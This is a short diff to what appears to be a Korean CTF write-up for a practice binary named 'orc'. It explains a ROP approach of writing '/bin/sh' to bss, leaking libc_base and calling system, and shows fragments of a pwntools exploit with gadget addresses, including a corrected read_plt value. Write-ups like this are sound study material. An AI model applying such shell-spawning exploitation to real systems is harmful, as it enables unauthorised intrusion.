@@ -106,7 +106,8 @@ p.interactive()
 ## orc 
 
 You can use only read  
-read를 사용하여 "/bin/sh"를 bss 영역에 쓸 수 있지만, system함수가 주어지지 않았으므로 라이브러리에서 찾아야 한다. read함수를 사용할 수 있으므로 현재 프로세스에서 libc_base를 구한 뒤 offset을 더하여 system 함수를 사용할 수 있다.
+read를 사용하여 "/bin/sh"를 bss 영역에 쓸 수 있지만, system함수가 주어지지 않았으므로 라이브러리에서 찾아야 한다. read함수를 사용할 수 있으므로 현재 프로세스에서 libc_base를 구한 뒤 offset을 더하여 system 함수를 사용할 수 있다.  
+read_plt를 구하고, 
 
 ```python
 from pwn import *
@@ -115,7 +116,7 @@ p = process("./orc")
 
 pop_ret = 0x08049022
 pop3_ret = 0x08049391
-read_plt = 0x80490b0
+read_plt = 0x80490a0
 bss = 0x804c030 + 0x300
 main = 0x80492f3
 
